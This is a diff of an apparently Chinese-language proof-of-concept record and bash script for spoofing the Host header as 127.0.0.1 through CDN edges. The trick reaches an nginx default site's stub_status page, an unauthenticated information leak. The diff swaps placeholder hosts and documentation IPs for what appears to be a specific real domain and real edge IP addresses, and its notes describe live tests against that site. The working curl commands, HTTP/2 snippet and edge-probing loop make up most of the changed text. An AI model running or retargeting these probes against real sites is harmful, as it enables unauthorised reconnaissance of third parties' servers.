@@ -8,11 +8,11 @@
 - **language**: bash
 - **source**: self
 - **verified**: 1
-- **verified_note**: 2026-11-02 13:44-13:47 (+08) 在 https://target485.example.com 实测（Windows curl.exe，--resolve 固定边缘、SNI/URL 保持 www 域名、仅改 Host: 127.0.0.1）：GET /nginx_status → HTTP/1.1 200、Content-Type: text/plain、116B，正文 "Active connections: 64 / server accepts handled requests / 304351 304351 2402612 / Reading: 0 Writing: 27 Waiting: 37"；同一 URL 用 Host: target485.example.com 只回 200 + 798B text/html（Sub2API SPA index），证明差异由 Host 造成。GET /50x.html（Host: 127.0.0.1）→ 200/497B nginx 默认 Error 页，印证默认站 docroot 为 nginx 自带 html 目录。在边缘 192.0.2.6/112/121/126/133/136 共 6 台上全部复现，且各边缘回显的 accepts 计数连续递增（同一计数器）⇒ 判定为同一源站、边缘纯按 Host 回源。此前 2026-11-01 在边缘 192.0.2.5 已有同结论（107B，accepts 2900），本条为跨边缘加固证据。
+- **verified_note**: 2026-11-02 13:44-13:47 (+08) 在 https://www.dahurj999.top 实测（Windows curl.exe，--resolve 固定边缘、SNI/URL 保持 www 域名、仅改 Host: 127.0.0.1）：GET /nginx_status → HTTP/1.1 200、Content-Type: text/plain、116B，正文 "Active connections: 64 / server accepts handled requests / 304351 304351 2402612 / Reading: 0 Writing: 27 Waiting: 37"；同一 URL 用 Host: www.dahurj999.top 只回 200 + 798B text/html（Sub2API SPA index），证明差异由 Host 造成。GET /50x.html（Host: 127.0.0.1）→ 200/497B nginx 默认 Error 页，印证默认站 docroot 为 nginx 自带 html 目录。在边缘 23.147.164.111/112/121/126/133/136 共 6 台上全部复现，且各边缘回显的 accepts 计数连续递增（同一计数器）⇒ 判定为同一源站、边缘纯按 Host 回源。此前 2026-11-01 在边缘 23.147.164.126 已有同结论（107B，accepts 2900），本条为跨边缘加固证据。
 - **path**: pocs/edge-host-127.0.0.1-baota-default-site-nginx-stub-status-una/poc.sh
 - **tags**: nginx, stub-status, host-header, 127.0.0.1, 宝塔, default_server, cdn回源, 信息泄露, 未授权, recon, h2-authority, peekabo, 多边缘复测
 - **created_at**: 2026-11-01T08:13:15.811Z
-- **engine**: https://target485.example.com（Peekabo/Photon-Edge 边缘 192.0.2.6/112/121/126/133/136）
+- **engine**: https://www.dahurj999.top（Peekabo/Photon-Edge 边缘 23.147.164.111/112/121/126/133/136）
 
 ## 描述
 
@@ -44,8 +44,8 @@ CDN/边缘按 Host 头回源且源站 nginx 配了 default_server（宝塔默认
 # 前置：URL 与 SNI 保持真实域名，只有 Host 头(:authority)被改成 127.0.0.1
 # 全程低频（<=3 req/s），每个变体都留正常对照
 
-HOST="target485.example.com"          # 用于 --resolve 与 SNI 的真实主机名
-EDGE="192.0.2.5"             # 已知边缘 IP；未知时可省略 --resolve 走 DNS
+HOST="www.dahurj999.top"          # 用于 --resolve 与 SNI 的真实主机名
+EDGE="23.147.164.126"             # 已知边缘 IP；未知时可省略 --resolve 走 DNS
 BASE="https://${HOST}"
 RES="--resolve ${HOST}:443:${EDGE}"
 CURL="curl -sS -k --noproxy * ${RES}"
@@ -81,7 +81,7 @@ $CURL -H "Host: 127.0.0.1" -D - "${BASE}/50x.html" | head -5
 # const r=c.request({':authority':'127.0.0.1',':path':'/nginx_status',':method':'GET'}); r.end();
 
 # ---- 2026-11-02 多边缘复测（task#612，加固「边缘纯按 Host 回源」这一判定）----
-# for ip in 192.0.2.6 192.0.2.7 192.0.2.8 192.0.2.5 192.0.2.9 192.0.2.10; do
+# for ip in 23.147.164.111 23.147.164.112 23.147.164.121 23.147.164.126 23.147.164.133 23.147.164.136; do
 #   echo "--- $ip"; curl -sS -k --noproxy '*' --resolve ${HOST}:443:${ip} \
 #     -H "Host: 127.0.0.1" "https://${HOST}/nginx_status"
 # done
